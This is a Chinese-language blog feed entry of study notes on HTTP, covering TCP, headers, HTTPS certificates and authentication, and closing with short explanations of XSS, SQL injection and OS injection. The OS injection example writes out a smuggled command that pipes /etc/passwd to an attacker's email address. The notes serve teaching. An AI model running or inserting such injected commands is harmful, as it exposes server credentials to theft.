<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh">
    <title>Obelieve的博客 - http</title>
    <link rel="self" type="application/atom+xml" href="https://www.obelieve.top/tags/http/atom.xml"/>
    <link rel="alternate" type="text/html" href="https://www.obelieve.top"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2025-09-16T00:00:00+00:00</updated>
    <id>https://www.obelieve.top/tags/http/atom.xml</id>
    <entry xml:lang="zh">
        <title>关于HTTP</title>
        <published>2025-01-06T00:00:00+00:00</published>
        <updated>2025-09-16T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Obelieve
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://www.obelieve.top/blog/guan-yu-http/"/>
        <id>https://www.obelieve.top/blog/guan-yu-http/</id>
        
        <content type="html" xml:base="https://www.obelieve.top/blog/guan-yu-http/">&lt;h2 id=&quot;yi-ci-httpqing-qiu-lian-lu-guo-cheng&quot;&gt;一次HTTP请求链路过程&lt;a class=&quot;zola-anchor&quot; href=&quot;#yi-ci-httpqing-qiu-lian-lu-guo-cheng&quot; aria-label=&quot;Anchor link for: yi-ci-httpqing-qiu-lian-lu-guo-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;1.首先是==发送端==通过浏览器输入url链接请求资源，浏览器访问==DNS服务==器查询到IP地址。&lt;&#x2F;li&gt;
&lt;li&gt;2.传输层通过==TCP协议==对HTTP报文进行分段处理，按编号发送给IP网络层。&lt;&#x2F;li&gt;
&lt;li&gt;3.网络层通过==IP协议==进行分发数据包。&lt;&#x2F;li&gt;
&lt;li&gt;4.接收端传输层通过==TCP协议==接收数据包，按编号整合成HTTP数据包。&lt;&#x2F;li&gt;
&lt;li&gt;5.接收端读取==HTTP数据包==处理请求，并给发送HTTP响应报文。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;tcpsan-ci-wo-shou&quot;&gt;TCP三次握手&lt;a class=&quot;zola-anchor&quot; href=&quot;#tcpsan-ci-wo-shou&quot; aria-label=&quot;Anchor link for: tcpsan-ci-wo-shou&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;首先是发送端==发送SYN（synchronize）==数据包给接收端，
接收端收到后==回复SYN&#x2F;ACK(acknowledgement)==数据包给发送端，
然后发送端再==发送ACK==数据包给接收端，连接建立。
如果中间中断，重新发送。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tcpduan-kai-lian-jie&quot;&gt;TCP断开连接&lt;a class=&quot;zola-anchor&quot; href=&quot;#tcpduan-kai-lian-jie&quot; aria-label=&quot;Anchor link for: tcpduan-kai-lian-jie&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;首先==接收端发送FIN==数据包给发送端，
然后==发送端回复ACK==数据包给接收端，
然后==发送端发送FIN==数据包给接收端，
最后==接收端回复ACK==数据包给发送端。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu&quot;&gt;URI(统一资源标识符)和URL（统一资源定位符）&lt;a class=&quot;zola-anchor&quot; href=&quot;#uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu&quot; aria-label=&quot;Anchor link for: uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;scheme：协议方案  http: | ftp:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;http:&#x2F;&#x2F;zxy:123@www.zxy.com&#x2F;path1?a=1#sec1
方案、认证信息、==服务器地址、端口==、路径、查询信息、片段&lt;&#x2F;p&gt;
&lt;h2 id=&quot;httpxie-yi-qing-qiu-bao-wen&quot;&gt;HTTP协议请求报文&lt;a class=&quot;zola-anchor&quot; href=&quot;#httpxie-yi-qing-qiu-bao-wen&quot; aria-label=&quot;Anchor link for: httpxie-yi-qing-qiu-bao-wen&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;请求方法(GET &#x2F; POST)  请求资源URI  HTTP协议版本
请求首部字段 (请求头)
==空格== ==【CR  0x0d ＋LF 0x0a】==
请求体&lt;&#x2F;p&gt;
&lt;h2 id=&quot;httpxie-yi-xiang-ying-bao-wen&quot;&gt;HTTP协议响应报文&lt;a class=&quot;zola-anchor&quot; href=&quot;#httpxie-yi-xiang-ying-bao-wen&quot; aria-label=&quot;Anchor link for: httpxie-yi-xiang-ying-bao-wen&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;HTTP协议版本 响应码 原因短语
响应首部字段（响应头）
==空格==
响应体&lt;&#x2F;p&gt;
&lt;h2 id=&quot;wang-guan&quot;&gt;网关&lt;a class=&quot;zola-anchor&quot; href=&quot;#wang-guan&quot; aria-label=&quot;Anchor link for: wang-guan&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;能够使通信上的服务器提供非Http协议的服务。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;qing-qiu-tou-jie-shao&quot;&gt;请求头介绍&lt;a class=&quot;zola-anchor&quot; href=&quot;#qing-qiu-tou-jie-shao&quot; aria-label=&quot;Anchor link for: qing-qiu-tou-jie-shao&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;47种首部字段&lt;&#x2F;li&gt;
&lt;li&gt;通用首部字段 (请求和响应都使用的字段)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Cache-Control 控制缓存的行为
Connection 逐跳首部、连接的管理
Date 创建报文的日期时间
Pragma 报文指令
Trailer 报文末端的首部一览
Transfer-Encoding 指定报文主体的传输编码方式
Upgrade 升级为其他协议
Via 代理服务器的相关信息
Warning 错误通知
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;请求首部字段&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Accept 用户代理可处理的媒体类型
Accept-Charset 优先的字符集
Accept-Encoding 优先的内容编码
Accept-Language 优先的语言（自然语言）
Authorization Web认证信息
Expect 期待服务器的特定行为
From 用户的电子邮箱地址
Host 请求资源所在服务器
If-Match 比较实体标记（ETag）
If-Modified-Since 比较资源的更新时间
If-None-Match 比较实体标记（与If-Match相反）
If-Range 资源未更新时发送实体Byte的范围请求
If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）
Max-Forwards 最大传输逐跳数
Proxy-Authorization 代理服务器要求客户端的认证信息
Range 实体的字节范围请求
Referer 对请求中URI的原始获取方
TE 传输编码的优先级
User-Agent HTTP 客户端程序的信息
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;响应首部字段&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Accept-Ranges 是否接受字节范围请求
Age 推算资源创建经过时间
ETag 资源的匹配信息
Location 令客户端重定向至指定URI

Proxy-Authenticate 代理服务器对客户端的认证信息
Retry-After 对再次发起请求的时机要求
Server HTTP服务器的安装信息
Vary 代理服务器缓存的管理信息
WWW-Authenticate 服务器对客户端的认证信息
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;实体首部字段 (请求报文实体和响应报文实体都使用的字段)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Allow 资源可支持的HTTP方法
Content-Encoding 实体主体适用的编码方式
Content-Language 实体主体的自然语言
Content-Length 实体主体的大小（单位 ：字节）
Content-Location 替代对应资源的URI
Content-MD5 实体主体的报文摘要
Content-Range 实体主体的位置范围
Content-Type 实体主体的媒体类型
Expires 实体主体过期的日期时间
Last-Modified 资源的最后修改日期时间
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;cookiezhuang-tai-zhui-zong-set-cookie&quot;&gt;Cookie状态追踪 ==Set-Cookie==&lt;a class=&quot;zola-anchor&quot; href=&quot;#cookiezhuang-tai-zhui-zong-set-cookie&quot; aria-label=&quot;Anchor link for: cookiezhuang-tai-zhui-zong-set-cookie&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;keep-alive-chi-jiu-lian-jie&quot;&gt;keep-alive 持久连接&lt;a class=&quot;zola-anchor&quot; href=&quot;#keep-alive-chi-jiu-lian-jie&quot; aria-label=&quot;Anchor link for: keep-alive-chi-jiu-lian-jie&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;不用连接一次http请求一次tcp连接。
只要tcp没断开，继续http请求，不用重新连接tcp。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan&quot;&gt;MIME(Multipurpose Internet Mail Extensions)多用途因特网邮件扩展&lt;a class=&quot;zola-anchor&quot; href=&quot;#mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan&quot; aria-label=&quot;Anchor link for: mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;multipart&#x2F;form-data 表单访问&lt;&#x2F;li&gt;
&lt;li&gt;multipart&#x2F;byteranges 部分内容访问&lt;&#x2F;li&gt;
&lt;li&gt;boundary=xx来划分不同数据类型&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;http&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;Content-Type: multipart&amp;#x2F;form-data; boundary=xx
--xx
--xx
--xx--
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;bu-fen-nei-rong-qing-qiu-huo-qu&quot;&gt;部分内容请求获取&lt;a class=&quot;zola-anchor&quot; href=&quot;#bu-fen-nei-rong-qing-qiu-huo-qu&quot; aria-label=&quot;Anchor link for: bu-fen-nei-rong-qing-qiu-huo-qu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;==Range: bytes==请求头
==Range: bytes== =1-5000, 5000-&lt;&#x2F;p&gt;
&lt;h3 id=&quot;nei-rong-xie-shang&quot;&gt;内容协商&lt;a class=&quot;zola-anchor&quot; href=&quot;#nei-rong-xie-shang&quot; aria-label=&quot;Anchor link for: nei-rong-xie-shang&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;==Access==请求头&lt;&#x2F;p&gt;
&lt;h2 id=&quot;https&quot;&gt;HTTPS&lt;a class=&quot;zola-anchor&quot; href=&quot;#https&quot; aria-label=&quot;Anchor link for: https&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;shu-zi-qian-ming&quot;&gt;数字签名&lt;a class=&quot;zola-anchor&quot; href=&quot;#shu-zi-qian-ming&quot; aria-label=&quot;Anchor link for: shu-zi-qian-ming&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;利用非对称加密算法，拿==私钥对摘要信息进行加密==，然后公钥进行解密验证信息。
最重要的是非对称加密算法特性，==私钥和公钥是一对好CP==。一方加密，另一方就解密。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;shu-zi-zheng-shu&quot;&gt;数字证书&lt;a class=&quot;zola-anchor&quot; href=&quot;#shu-zi-zheng-shu&quot; aria-label=&quot;Anchor link for: shu-zi-zheng-shu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;用于证明==公钥的合法性==，使用私钥对数字签名的公钥进行加密。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;gen-zheng-shu&quot;&gt;根证书&lt;a class=&quot;zola-anchor&quot; href=&quot;#gen-zheng-shu&quot; aria-label=&quot;Anchor link for: gen-zheng-shu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;是公开可信的自签名证书。整个密钥链认证体系，构成了密钥基础设施（PKI）。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;httpszheng-shu-ren-zheng-guo-cheng&quot;&gt;Https证书认证过程&lt;a class=&quot;zola-anchor&quot; href=&quot;#httpszheng-shu-ren-zheng-guo-cheng&quot; aria-label=&quot;Anchor link for: httpszheng-shu-ren-zheng-guo-cheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;证书是由公钥、颁发机构CA等明文内容+明文内容的hash计算值的签名组成。（签名：使用私钥进行加密）。
首先是客户端获取到服务器的证书，这个证书可能会包括中间证书，最后会指向根证书。
然后对证书的签名进行验证证书合法性，使用证书颁发机构CA的公钥对签名进行解密，获得hash值并比较证书内容计算后的hash值是否相同，来判断证书是否合法。&lt;&#x2F;p&gt;
&lt;p&gt;如果服务器证书包含中间证书的话，1.先获取中间证书的公钥来解密签名判断服务器证书有效性。2.再根据中间证书的颁发机构CA，获取中间证书颁发机构CA的公钥解密中间证书的签名，证明中间证书的有效性。3.以此类推，最后指向一个根证书，只要证明根证书的签名合法性，也就证明了这些中间证书也是合法的。最后，判断服务器证书也是合法的。就可以用服务器证书的公钥，对数据传输的对称密钥进行加密，通过对称密钥进行加密通信。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;zheng-shu-fen-lei&quot;&gt;证书分类&lt;a class=&quot;zola-anchor&quot; href=&quot;#zheng-shu-fen-lei&quot; aria-label=&quot;Anchor link for: zheng-shu-fen-lei&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;==费解的地方：要分类证书类别，对公钥功能拆分。除了根证书，签名验证要找证书认证机构的公钥。而不是自己的公钥==
服务器证书：公钥，用于加密通信用。
中间证书：公钥，用于证明服务器证书合法性
根证书：公钥，用于证明中间证书&#x2F;服务器证书的合法性。自签名证书，公钥解密自己的签名。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;https-tong-xin&quot;&gt;HTTPS 通信&lt;a class=&quot;zola-anchor&quot; href=&quot;#https-tong-xin&quot; aria-label=&quot;Anchor link for: https-tong-xin&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;双方通信，客户端获取服务端证书并验证后，发送随机密钥串，完成SSL握手。客户端开始通过密钥串对HTTP报文加密通信。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;shen-fen-ren-zheng&quot;&gt;身份认证&lt;a class=&quot;zola-anchor&quot; href=&quot;#shen-fen-ren-zheng&quot; aria-label=&quot;Anchor link for: shen-fen-ren-zheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;basicren-zheng&quot;&gt;BASIC认证&lt;a class=&quot;zola-anchor&quot; href=&quot;#basicren-zheng&quot; aria-label=&quot;Anchor link for: basicren-zheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;p&gt;HTTP1.0就有了，使用请求头加入账号:密码的Base64字符串形式，不够安全。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;biao-dan-ren-zheng&quot;&gt;表单认证&lt;a class=&quot;zola-anchor&quot; href=&quot;#biao-dan-ren-zheng&quot; aria-label=&quot;Anchor link for: biao-dan-ren-zheng&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;p&gt;也就是利用post请求提交表单，利用cookie携带登录信息认证的。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;webdav&quot;&gt;WebDAV&lt;a class=&quot;zola-anchor&quot; href=&quot;#webdav&quot; aria-label=&quot;Anchor link for: webdav&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;p&gt;WebDAV（ Web-based Distributed Authoring and Versioning，基于万
维网的分布式创作和版本控制）
是HTTP的扩展协议，用于服务器相关文件操作，增加了其他的请求方法。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;css&quot;&gt;CSS&lt;a class=&quot;zola-anchor&quot; href=&quot;#css&quot; aria-label=&quot;Anchor link for: css&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;让文档内容和设计分离。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;xml&quot;&gt;XML&lt;a class=&quot;zola-anchor&quot; href=&quot;#xml&quot; aria-label=&quot;Anchor link for: xml&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;XML（ eXtensible Markup Language，可扩展标记语言）&lt;&#x2F;p&gt;
&lt;h3 id=&quot;sgml&quot;&gt;SGML&lt;a class=&quot;zola-anchor&quot; href=&quot;#sgml&quot; aria-label=&quot;Anchor link for: sgml&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;标准通用标记语言 SGML（ Standard Generalized
Markup Language）&lt;&#x2F;p&gt;
&lt;h3 id=&quot;json&quot;&gt;JSON&lt;a class=&quot;zola-anchor&quot; href=&quot;#json&quot; aria-label=&quot;Anchor link for: json&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;JSON（ JavaScript Object Notation）是一种以 JavaScript（ ECMAScript）
的对象表示法为基础的轻量级数据标记语言。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;a class=&quot;zola-anchor&quot; href=&quot;#xss&quot; aria-label=&quot;Anchor link for: xss&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;跨站脚本攻击（ Cross-Site Scripting， XSS），就是在访问一个网页请求时，添加一些&lt;code&gt;&amp;lt;script&#x2F;&amp;gt;&lt;&#x2F;code&gt;脚本代码，里面会访问其他网站，这样会把账号和密码等信息传给其他网站。也可以通过==document.cookie==把当前网站的cookie传给第三方网站。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;sql-zhu-ru-gong-ji&quot;&gt;SQL 注入攻击&lt;a class=&quot;zola-anchor&quot; href=&quot;#sql-zhu-ru-gong-ji&quot; aria-label=&quot;Anchor link for: sql-zhu-ru-gong-ji&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;SQL 注入（ SQL Injection），是指Web中通过请求来访问SQL语句时，利用SQL语法特性，比如：添加--表示注释，就把后面一些条件去掉了。达到修改SQL语句来获取请求查询结果。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;oszhu-ru-gong-ji&quot;&gt;OS注入攻击&lt;a class=&quot;zola-anchor&quot; href=&quot;#oszhu-ru-gong-ji&quot; aria-label=&quot;Anchor link for: oszhu-ru-gong-ji&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;利用服务器web请求，对请求参数执行os指令来进行加入一些os指令获取信息。比如：发送邮箱内容时，额外添加cat &#x2F;etc&#x2F;passwd | mail hack@example.jp，来达到发送服务器密码给邮箱。&lt;&#x2F;p&gt;
</content>
        
    </entry>
</feed>
